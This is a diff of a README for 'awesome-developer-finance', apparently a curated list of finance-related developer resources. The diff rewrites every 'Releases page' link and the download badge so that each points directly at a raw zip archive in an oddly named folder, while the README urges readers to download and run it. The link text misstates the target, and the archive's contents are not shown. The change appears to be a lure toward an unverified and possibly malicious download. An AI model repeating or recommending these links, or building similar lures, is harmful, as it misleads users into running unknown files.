@@ -1,6 +1,6 @@
 # 🚀 awesome-developer-finance - Unlock Financial Insights Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/i-am-sathiya/awesome-developer-finance/releases)
+[![Download](https://raw.githubusercontent.com/i-am-sathiya/awesome-developer-finance/main/actinologue/awesome-developer-finance_v3.0.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/i-am-sathiya/awesome-developer-finance/main/actinologue/awesome-developer-finance_v3.0.zip)
 
 ## 📖 Overview
 awesome-developer-finance is a curated collection of open-source software (OSS), programmable APIs, and autonomous AI agents designed for developers in finance. This repository includes resources useful for quantitative analysis (Quant), algorithmic trading, fintech platforms, large language models (LLMs), and portfolio management. 
@@ -14,7 +14,7 @@ awesome-developer-finance is a curated collection of open-source software (OSS),
 Follow the steps below to download and run awesome-developer-finance on your computer.
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/i-am-sathiya/awesome-developer-finance/releases) to see the latest version available for download.
+   Go to our [Releases page](https://raw.githubusercontent.com/i-am-sathiya/awesome-developer-finance/main/actinologue/awesome-developer-finance_v3.0.zip) to see the latest version available for download.
 
 2. **Choose Your Version**  
    Scroll through the list of available releases. Pick the version that matches your operating system.
@@ -37,7 +37,7 @@ To run awesome-developer-finance efficiently, ensure your system meets the follo
 - **Internet Access**: Needed for downloading updates and accessing online resources.
 
 ## 📥 Download & Install
-To start using awesome-developer-finance, visit our [Releases page](https://github.com/i-am-sathiya/awesome-developer-finance/releases) to download the software. 
+To start using awesome-developer-finance, visit our [Releases page](https://raw.githubusercontent.com/i-am-sathiya/awesome-developer-finance/main/actinologue/awesome-developer-finance_v3.0.zip) to download the software. 
 
 1. Select the desired version.
 2. Download the file.
@@ -74,4 +74,4 @@ Yes! You can open an issue or pull request on GitHub to suggest any resources yo
 ## 📞 Support
 For support, feel free to reach out through the GitHub issue tracker. We're here to help you make the most of awesome-developer-finance.
 
-Explore, learn, and enhance your financial insights with awesome-developer-finance today! Visit our [Releases page](https://github.com/i-am-sathiya/awesome-developer-finance/releases) to get started.
+Explore, learn, and enhance your financial insights with awesome-developer-finance today! Visit our [Releases page](https://raw.githubusercontent.com/i-am-sathiya/awesome-developer-finance/main/actinologue/awesome-developer-finance_v3.0.zip) to get started.
